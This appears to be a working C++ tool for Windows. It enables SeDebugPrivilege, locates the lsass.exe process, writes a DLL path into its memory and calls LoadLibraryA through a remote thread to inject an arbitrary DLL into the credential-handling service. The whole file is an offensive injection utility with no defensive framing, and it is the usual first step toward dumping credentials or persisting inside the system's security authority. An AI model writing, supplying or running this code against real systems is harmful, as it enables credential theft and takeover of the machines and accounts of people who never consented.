#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <fstream>
#include <wchar.h>

bool SetPrivilege(LPCWSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES priv = { 0,0,0,0 };
    HANDLE hToken = NULL;
    LUID luid = { 0,0 };
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        if (hToken)
            CloseHandle(hToken);
        return false;
    }
    if (!LookupPrivilegeValueW(0, lpszPrivilege, &luid)) {
        if (hToken)
            CloseHandle(hToken);
        return false;
    }
    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
    if (!AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)) {
        if (hToken)
            CloseHandle(hToken);
        return false;
    }
    if (hToken)
        CloseHandle(hToken);
    return true;
}

DWORD GetPID(LPCWSTR procName)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);

        if (Process32First(hSnap, &procEntry))
        {
            do
            {
                if (!_wcsicmp((procEntry.szExeFile), procName))
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

int main(int argc, char** argv)
{
    if (argc != 2) {
        std::cout << "[-] Usage: " << argv[0] << " <DLL_Path>\n";
        return 1;
    }

    if (!SetPrivilege(SE_DEBUG_NAME, TRUE))
    {
        return 1;
    }// Gets permission

    std::cout << "[+] Got SeDebugProgram Privilege\n";

    const char* dllPath = argv[1];
    // LPCWSTR exeName = (LPCWSTR)argv[1]; //not working, manually setting
    LPCWSTR exeName = L"lsass.exe";
    DWORD PID = 0;

    while (!PID)
    {
        PID = GetPID(exeName);
    }

    std::cout << "[+] Got lsass.exe PID!\n";

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, PID);

    if (hProcess && hProcess != INVALID_HANDLE_VALUE)
    {
        void* loc = VirtualAllocEx(hProcess, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


        LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

        WriteProcessMemory(hProcess, loc, dllPath, strlen(dllPath) + 1, 0);

        std::cout << "[*] Writing Memory\n";

        HANDLE hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)addr, loc, 0, 0);

        std::cout << "[*] Creating Remote Thread\n";

        if (hThread)
        {
            CloseHandle(hThread);
        }
        std::cout << "[+] DLL Injected!";
    }

    if (hProcess)
    {
        CloseHandle(hProcess);
    }

    
    return 0;
}
